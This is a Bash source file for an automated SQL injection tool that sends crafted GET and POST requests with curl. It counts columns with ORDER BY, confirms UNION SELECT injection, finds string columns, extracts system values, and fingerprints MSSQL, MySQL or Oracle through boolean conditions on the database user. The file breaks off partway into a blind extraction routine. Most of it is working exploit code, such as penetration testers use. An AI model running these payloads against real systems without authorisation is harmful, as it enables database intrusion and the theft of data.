#!/bin/bash
# ./sqli-fuzzer30.sh

#############global variables##############

#default delay duration to use for timedelay testing: 
timedelay="20"

#delay threshold in seconds. When running a time delay scan, this can be set to tune out false positives. This should be higher than 'normal' request times to prevent false positives, but lower than the timedelay value:
timedelaythreshhold="1" 

# set the search term to a non-null value to prevent a match on an blank value:
ErrorString="foo123rewerwer435345345345"

# function definitions
encodeme()
{
encodeoutput=`echo $encodeinput  | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c" | replace "/" "%2f"`

decodeoutput=`echo $decodeoutput | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" "," | replace "%2f" "/"`;
}

#encodeinput=foo
#encodeme
#foo=$encodeoutput

#decodeinput=foo
#encodeme
#foo=$decodeoutput

requester()
{
#recieves badparams (a string of all params, including the fuzzed param)
#returns: 
#	request - a string - the request sent in sqlifuzzer format
#	response - a string - containing the httpcode,length and duration of the response
if [[ $method != "POST" ]]; then #we're doing a get - simples					
	# send a 'normal' request
	response=`curl $uhostname$page"?"$badparams -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
	request="$method URL: $uhostname$page"?"$badparams"
else	# we're doing a POST - not so simple...
	if (($firstPOSTURIURL>0)) ; then
		if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
			response=`curl -d "$static" $uhostname$page"?"$badparams -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
			request="$method URL: $uhostname$page?$badparams??$static" 	
		fi
		if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
			response=`curl -d "$badparams" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
			request="$method URL: $uhostname$page??$badparams" 
		fi
	else #just a normal POST:
		response=`curl -d "$badparams" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
		request="$method URL: $uhostname$page?$badparams" 		
	fi
fi
}


orderbycheck()
{
#need to check we have a valid orderby test string

badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by 9659$end"`
#echo "debug $badparams"

encodeinput=$badparams
encodeme
badparams=$encodeoutput

#echo "debug $badparams"

requester

#status999=200
status999=`echo $response | cut -d ":" -f 1`
length999=`echo $response | cut -d ":" -f 2`

badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by 1$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester

#status1=200
status1=`echo $response | cut -d ":" -f 1`
length1=`echo $response | cut -d ":" -f 2`
ordlngthdiff=0
((lendiff=$length1-$length999))
if [[ "$lendiff" -gt 4 || "$lendiff" -lt 4 ]] ; then
	ordlngthdiff=1
fi
echo "Order by 1 got a $status1 response, order by 9659 got a $status999 response"
}

orderbyrequest()
{
count=1
columns=150
while [[ $count -lt $columns ]] ; do
		badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by $count$end"`
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		statusX=`echo $response | cut -d ":" -f 1`
		if [[ "$statusX" != "$status1" ]] ; then 
			((colno=$count-1))
			echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K]\033[0m $request"
			tput sgr0 # Reset attributes.
			echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
			success=1
			break 
		fi
		let "count+=1"
done
}

#orderbyrequestbinchop()
#TODO get this woking...
#{
#i=80
#old=40
#down=1
#resp_error=0
#while [[ $i -gt 0 ]] ; do
#	badparams=`echo "$outputstore" | replace "$testpayload" "1$quote+order+by+$i$end"`
#	echo "Debug: $badparams#"
#	echo "down: $down"
#	if [[ "$resp_error" == "1" ]] ; then
#		if [[ "$down" == "1" ]] ; then
#			((i=$i/2))
#		else #we are going upward
#			((i=$i*2)) 
#		fi
#	else #we didnt get an error
#		#first: store the old vaule:
#		store=$old
#		#test to see if we have got the right number of columns by issuing an order by one greater than i
#		#if this gets an error, we have got the right answer
#		((onemorethani=$i+1))  
#		badparams=`echo "$outputstore" | replace "$testpayload" "1$quote+order+by+$onemorethani$end"`
#		requester
#		statusX=`echo $response | cut -d ":" -f 1`
#		lengthX=`echo $response | cut -d ":" -f 2`
#		#have to store the old $request value
#		oldrequest=$request
#		if [[ "$statusX" != "200" ]] ; then	
#			((colno=$i-1))
#			echo -e '\E[31;48m'"\033[1m[ORDER BY: $i COL REQ:$K]\033[0m $oldrequest"
#			tput sgr0 # Reset attributes.
#			echo "[ORDER BY: $i COL REQ:$K] $oldrequest" >> ./output/$safefilename$safelogname.txt;
#			success=1
#			break 
#		else # we havent got the right answer
#			((i=$store*0.75))
#		fi
#	fi
#	requester
#	statusX=`echo $response | cut -d ":" -f 1`
#	lengthX=`echo $response | cut -d ":" -f 2`
#	if [[ "$status1" == "200" && "$status1" != "$statusX" ]] ; then 
#		resp_error=1
#		old=$i	
#	else
#		resp_error=0
#	fi
#	#elif [[ "$status1" == "200" && "$status1" == "$statusX" ]] ; then
#	#	((length=$length1-$lengthx))
#	#	if [[ $length -gt 4 || $length -lt -4 ]] then
#	#	#this tries to account for apps that return a status 200 error page by measuring response length diffs
#	#	((half_i=$i/2))
#	#	((i=$i+$half_i))
#	#else
#	#	((i=$i/2))
#	#if no error, we double the value
#	if [[ $statusX == 200 ]] ; then
#		((i=$i*2))
#	fi
#done
#}

orderby()
{
#function to determine the number of columns in a where clause

#recieves: 
#	$payload (the clean, unencoded payload) to look for SQLi metachars at begininng and end of payload
#	$outputstore which holds the current paramstring (the encoded payload and the other unfuzzed params)
#returns:
#	$badparams a version of the paramstring taken from outputstore with the fuzzed payload replaced with an order by
#	$outputs enumerated column number info to the screen 		

#this code looks at the exploit payload and tries to determine the SQLi metacharacters used:
#was there a single quote at the begining? was there a comment char (- or #) at the end?
#these may be needed to encapsulate our our 'order by x' payload for it to work 
oracledb=0
firstchar="${payload:1:1}"
if [[ "$firstchar" == "'" ]] ; then	
	quote="'"
else
	quote=""
fi

#echo "Debug $payload"
lastchar="${payload: -1}"
if [[ "$lastchar" == "-" ]] ; then
	end="--"
elif [[ "$lastchar" == "#" ]] ; then
	end="-- #"
else
	end=""
fi

orderbycheck

#echo "$request"


#if you get two non-200 status's back, both 'order by x' requests failed; append an '--' on the end: 
if [[ "$status1" != "200" && "$status1" == "$status999" ]] ; then
	end="--"
	orderbycheck
fi

#if status1 is different from status999 and status1 was a 200 you should be golden!
success=0
if [[ "$status1" != "$status999" && "$status1" == "200" ]] ; then
	# a difference between the two order by statements - we are good for order by column number enum
	echo "Using 'order by x' and response http status diffing to determine the number of columns"
	orderbyrequest
fi

#if the above didnt work out,
#repeat the above, appending a # instead of --
if [[ "$success" == 0 ]] ; then
	if [[ "$status1" != "200" && "$status1" == "$status999" ]] ; then
		end='-- #'
		orderbycheck
	fi
	if [[ "$status1" != "$status999" && "$status1" == "200" ]] ; then
		# a difference between the two order by statements - we are good for order by column number enum
		echo "Using 'order by x' and response http status diffing to determine the number of columns"
		orderbyrequest
	fi
fi

#ok, lets say you have an app that did show a difference between order by 1 and order by 908098, BUT not in the status, in the response length:
if [[ "$success" == 0 ]] ; then
	#end is currently set to #
	orderbycheck
	if [[ "$status1" == "200" && "$status999" == "200" && "$ordlngthdiff" == "1" ]] ; then
		# a difference IN LENGTH between the two order by statements - we are good for order by column number enum
		echo "Using 'order by x' and response length diffing to determine the number of columns"
		count=1
		columns=150
		while [[ $count -lt $columns ]] ; do
				echo -n "."
				badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote order by $count$end"`
				requester
				lengthX=`echo $response | cut -d ":" -f 2`
				if [[ "$lengthX" != "$length1" ]] ; then
					echo "" 
					((colno=$count-1))
					echo -e '\E[31;48m'"\033[1m[ORDER BY: $colno COL REQ:$K] $request\033[0m"
					tput sgr0 # Reset attributes.
					echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
					success=1
					break 
				fi
				let "count+=1"
		done
	fi
fi
#if one of the above order by did work then lets try a union select
if [[ "$success" == 1 ]] ; then
	unionselect
fi

}

unionselect()
{
echo "Running UNION SELECT tests" 
#we need to create a string like union select null,null,null,null with a 'null,' for the colno (number of columns from the order by x) 
((nullcount=0))
nullstring=""
while [[ $nullcount -lt $colno ]] ; do
	((nullcount=$nullcount+1))
	if (($nullcount==$colno)) ; then 
		nullstring=$nullstring"null"
	else
		nullstring=$nullstring"null,"
	fi
done

#we create a nullstring similar to the above but with one extra null to use as a request that should fail
((nullcount=0))
nullwrongstring="null,"
while [[ $nullcount -lt $colno ]] ; do
	((nullcount=$nullcount+1))
	if (($nullcount==$colno)) ; then 
		nullwrongstring=$nullwrongstring"null"
	else
		nullwrongstring=$nullwrongstring"null,"
	fi
done

badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullwrongstring$end"`

encodeinput=$badparams
encodeme
badparams=$encodeoutput
#echo "DEBUG wrong $badparams"
requester
statusselN=`echo $response | cut -d ":" -f 1`
lengthselN=`echo $response | cut -d ":" -f 2`

badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
#echo "DEBUG right $badparams"
requester
statusselY=`echo $response | cut -d ":" -f 1`
lengthselY=`echo $response | cut -d ":" -f 2`
selectsuccess=0
#note that the response length check is disabled here by '|| $lengthselN != $lengthselN' 
#this is to get things running based on status codes, then go to length diffing later
if [[ $statusselY != $statusselN || $lengthselN != $lengthselN ]] ; then
	echo -e '\E[31;48m'"\033[1m[UNION SELECT: $colno COL REQ:$K]\033[0m $request"
	tput sgr0 # Reset attributes.
	echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
	selectsuccess=1
fi

if [[ "$selectsuccess" == 0 ]] ; then
	#try using a from dual - this might be an oracle db

	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring$end"`
	#echo "DEBUG right $badparams"
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	statusselY=`echo $response | cut -d ":" -f 1`
	lengthselY=`echo $response | cut -d ":" -f 2`

	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring from dual$end"`
	#echo "DEBUG oracle $badparams"
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	statusselDUAL=`echo $response | cut -d ":" -f 1`
	lengthselDUAL=`echo $response | cut -d ":" -f 2`
	#note that the response length check is disabled here by '|| $lengthselN != $lengthselN' 
	#this is to get things running based on status codes, then go to length diffing later
	if [[ $statusselDUAL == "200" && $statusselY != $statusselDUAL || $lengthselN != $lengthselN ]] ; then
		#echo "UNION SELECT looks good! $request"
		echo -e '\E[31;48m'"\033[1m[ORACLE DB DETECTED - FROM DUAL REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[ORACLE DB DETECTED - FROM DUAL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
		
		echo -e '\E[31;48m'"\033[1m[UNION SELECT: $colno COL REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
	
		selectsuccess=1
		dbms="oracle"
	fi
fi

#if the union select worked, lets enumerate the data types
if [[ "$selectsuccess" == 1 ]] ; then
	selinject="'qwEqrEe'"
	unionselectout
fi

}

unionselectout()
{
echo "Using UNION SELECT to test for string columns"
((selparamcount=1))
while [[ $selparamcount -le $colno ]] ; do
	#we need to create a string like union select null,'asdwerwe',null,null with a 'null,' for the colno (number of columns from the order by x) 
	((nullcount=0))
	nullstring=""
	while [[ $nullcount -lt $colno ]] ; do
		((nullcount=$nullcount+1))
		if (($nullcount==$colno)) ; then
			if (($nullcount==$selparamcount)) ; then
				if [[ $oracledb == 1 ]] ; then
					nullstring=$nullstring$selinject" from dual"
				else
					nullstring=$nullstring$selinject
				fi
			else
				if [[ $oracledb == 1 ]] ; then
					nullstring=$nullstring"null from dual"
				else	
					nullstring=$nullstring"null"
				fi
			fi
		else 
			if (($nullcount==$selparamcount)) ; then
				nullstring=$nullstring$selinject","
			else
				nullstring=$nullstring"null,"
			fi
		fi
	done
	
	#we create a nullstring similar to the above but with one extra null to use as a request that should fail
	((nullcount=0))
	nullwrongstring=""
	while [[ $nullcount -lt $colno ]] ; do
		((nullcount=$nullcount+1))
		if (($nullcount==$colno)) ; then
			if (($nullcount==$selparamcount)) ; then
				if [[ $oracledb == 1 ]] ; then
					nullwrongstring=$nullwrongstring$selinject" from dual"
				else
					nullwrongstring=$nullwrongstring$selinject
				fi
			else
				if [[ $oracledb == 1 ]] ; then
					nullwrongstring=$nullwrongstring"null from dual"
				else
					nullwrongstring=$nullwrongstring"null"
				fi
			fi
		else 
			if (($nullcount==$selparamcount)) ; then
				nullwrongstring=$nullwrongstring$selinject","
			else
				nullwrongstring=$nullwrongstring"null,"
			fi
		fi
	done
	nullwrongstring=$nullwrongstring",null"
	
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullwrongstring$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	#echo "DEBUG wrong $badparams"
	requester
	statusselN=`echo $response | cut -d ":" -f 1`
	lengthselN=`echo $response | cut -d ":" -f 2`
	
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1$quote union select $nullstring$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	#echo "DEBUG right $badparams"
	requester
	statusselY=`echo $response | cut -d ":" -f 1`
	lengthselY=`echo $response | cut -d ":" -f 2`

	ordlngthdiff=0
	((lendiff=$lengthselY-$lengthselN))
	if [[ "$lendiff" -gt 4 || "$lendiff" -lt 4 ]] ; then
		ordlngthdiff=1
	fi
	stringcolumnfound=0
	if [[ $statusselY != $statusselN && $statusselY == 200 ]] ; then
		echo -e '\E[31;48m'"\033[1m[UNION SELECT STRING COLUMN $selparamcount REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[UNION SELECT STRING COLUMN $selparamcount REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
		stringcolumnfound=1
		selectsystemstrings
	fi

	if [[ $statusselY == $statusselN && $statusselY == 200 && ordlngthdiff == 1 ]] ; then
		echo -e '\E[31;48m'"\033[1m[UNION SELECT STRING COLUMN $selparamcount REQ:$K]\033[0m $request"
		tput sgr0 # Reset attributes.
		echo "[UNION SELECT STRING COLUMN $selparamcount REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
		stringcolumnfound=1
		selectsystemstrings
	fi
((selparamcount=$selparamcount+1))
done	
if [[ $stringcolumnfound == 0 ]] ; then
	echo "No string columns found"
fi
}

selectsystemstrings()
{
echo "Attempting to extract system parameters (reading params from ./payloads/system-params.txt)"
cat ./payloads/system-params.txt | while read inj3ct ; do
	badparams=`echo "$cleanoutput" | replace "$testpayload" "0$quote union select $nullstring$end" | replace " from dual" ""`
#	badparams=`echo "$outputstore"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	rm ./selcheck1
	cp ./dump ./selcheck1
	#newencodedpayload=`echo $inj3ct | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c"`
	badparams=`echo "$badparams" | replace "$selinject" "$inj3ct"`
	#echo "Debug: $badparams"
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	status=`echo $response | cut -d ":" -f 1`
	systemstring=`diff ./dump ./selcheck1`
	#for a union select to be working, you should be getting a 200 status back:
	if [[ "$systemstring" != "" && $status == "200" ]] ; then
		diff ./dump ./selcheck1 > ./responsediffs/$safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt
		######
		if [[ $method != "POST" ]]; then #we're doing a get - simples 
			echo "[DATA-EXTRACTED $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
			echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" ;
			tput sgr0 # Reset attributes.
		else
			if (($firstPOSTURIURL>0)) ; then
				if [ $firstPOSTURIURL == 1 ] ; then
					echo "[DATA-EXTRACTED $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$static"??"$badparams" >> ./output/$safefilename$safelogname.txt
					echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$badparams";
					tput sgr0 # Reset attributes.
				else
					echo "[DATA-EXTRACTED $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname	$page"??"$badparams" >> ./output/$safefilename$safelogname.txt
					echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"??"$badparams";
					tput sgr0 # Reset attributes.
				fi
			else
				#normal post
				echo "[DATA-EXTRACTED $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
				echo -e '\E[31;48m'"\033[1m[DATA-EXTRACTED $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
				tput sgr0 # Reset attributes.
			fi
		fi
	######
	fi
done
}

echoreporter()
{
######
if [[ $method != "POST" ]]; then #we're doing a get - simples 
	echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
	echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" ;
	tput sgr0 # Reset attributes.
else
	if (($firstPOSTURIURL>0)) ; then
		if [ $firstPOSTURIURL == 1 ] ; then
			echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$static"??"$badparams" >> ./output/$safefilename$safelogname.txt
			echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$badparams";
			tput sgr0 # Reset attributes.
		else
			echo "[$remessage REQ:$K] $method URL: $uhostname	$page"??"$badparams" >> ./output/$safefilename$safelogname.txt
			echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"??"$badparams";
			tput sgr0 # Reset attributes.
		fi
	else
		#normal post
		echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
		echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		tput sgr0 # Reset attributes.
	fi
fi
}

dbtypecheck()
{
# try to figure out the backend db using conditional tests:

#beginning of dbms enumeration if statement:
if [[ "$dbms" != "" ]] ; then
	echo "DBMS already specified as $dbms"
else
	echo "Running conditional tests to determine DB type"
fi
#mssqlcheck - only works on numeric params
badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug sending $request"
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug sending $request"
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MSSQL"
	echoreporter
	dbms="mssql"
	numerator="1 or 789=789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		remessage="LENGTH DIFF EQUALS $lendiff DB is MSSQL"
		echoreporter
		dbms="mssql"
		numerator="1 or 789=789"
 		#lettergrab
	fi
fi

#mssqlcheck - only works on string params
badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug true $request"
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug false $request"
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MSSQL"
	echoreporter
	dbms="mssql"
	numerator="a' or 789=789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		remessage="LENGTH DIFF EQUALS $lendiff DB is MSSQL"
		echoreporter
		dbms="mssql"
		numerator="a' or 789=789"
 		#lettergrab
	fi
fi

#mysqlcheck - only works on numeric params
badparams=`echo "$cleanoutput" | replace "$testpayload" "1/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug true $request"
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$testpayload" "1/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
#echo "debug false $request"
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MYSQL"
	echoreporter
	dbms="mysql"
	numerator="789=789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		remessage="LENGTH DIFF EQUALS $lendiff DB is MYSQL"
		echoreporter
		dbms="mysql"
		numerator="789=789"
 		#lettergrab
	fi
fi

#mysqlcheck - only works on string params
badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789=789/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is MYSQL"
	echoreporter
	numerator="1' or 789"
	dbms="mysql"
 	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		remessage="LENGTH DIFF EQUALS $lendiff DB is MYSQL"
		echoreporter
		dbms="mysql"
		numerator="1' or 789"
 		#lettergrab
	fi
fi


#oraclecheck - only works on numeric params
badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 255) then 1 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
	dbms="oracle"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
	echoreporter
	numerator="1 or 789"
	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		dbms="oracle"
		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
		echoreporter
		numerator="1 or 789"
		#lettergrab
	fi
fi

#oraclecheck - only works on string params
badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 0) then 789 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 255) then 789 else 0 end)$end"`
encodeinput=$badparams
encodeme
badparams=$encodeoutput
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
	dbms="oracle"
	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
	numerator="1' or 789"
	echoreporter
	#lettergrab
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
		#tput sgr0 # Reset attributes.
		dbms="oracle"
		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
		numerator="1' or 789"
		echoreporter
		#lettergrab
	fi
fi
#end of dbms enumeraton if statement
lettergrab

if [[ "$dbms" == "" ]] ; then
	echo "Could not determine DBMS"	
fi
}

lettergrab()
{
###get the length of the string
horiz=40
oflag=1
while [[ $oflag -lt $horiz ]] ; do 
	#only need to send the reference request (below) once
	#this determines the 'always wrong' reference request to suit the dbms:
	if [[ $oflag == "1" ]] ; then 
		if [[ $dbms == "mssql" ]] ; then                            
			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (len(system_user) = 999) then 789 else 0 end)$end"`
		elif [[ $dbms == "mysql" ]] ; then
			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (length(system_user()) = 999) then 789 else 0 end)$end"`
		elif [[ $dbms == "oracle" ]] ; then
